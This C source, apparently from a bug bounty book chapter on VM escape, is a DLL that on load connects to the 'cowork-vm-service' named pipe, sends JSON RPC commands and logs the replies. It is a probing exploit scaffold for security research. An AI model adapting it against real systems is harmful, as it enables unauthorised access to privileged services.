// Extraído de: LibroBugBounty/cap-13-vm-escape-rpc.md
// pipe_inject.c — DLL que conecta al pipe de CoworkVMService
#include <windows.h>
#include <stdio.h>

void send_rpc(HANDLE pipe, const char* method, const char* params) {
    char request[4096];
    int len = snprintf(request + 4, sizeof(request) - 4,
        "{\"method\":\"%s\",\"params\":{%s}}", method, params);

    // Length prefix (4 bytes Big-Endian)
    request[0] = (len >> 24) & 0xFF;
    request[1] = (len >> 16) & 0xFF;
    request[2] = (len >>  8) & 0xFF;
    request[3] = len & 0xFF;

    DWORD written;
    WriteFile(pipe, request, len + 4, &written, NULL);

    // Leer respuesta
    char response[65536];
    DWORD read_bytes;
    ReadFile(pipe, response, sizeof(response), &read_bytes, NULL);

    // Parsear length prefix y extraer JSON
    if (read_bytes > 4) {
        response[read_bytes] = '\0';
        // Log resultado
        FILE* f = fopen("C:\\Users\\Public\\rpc_result.txt", "a");
        fprintf(f, "[%s] %s\n", method, response + 4);
        fclose(f);
    }
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r) {
    if (reason != DLL_PROCESS_ATTACH) return TRUE;

    HANDLE pipe = CreateFileA(
        "\\\\.\\pipe\\cowork-vm-service",
        GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING, 0, NULL
    );

    if (pipe == INVALID_HANDLE_VALUE) return TRUE;

    // Prueba: configure + isRunning
    send_rpc(pipe, "configure", "");
    send_rpc(pipe, "isRunning", "");

    CloseHandle(pipe);
    return TRUE;
}
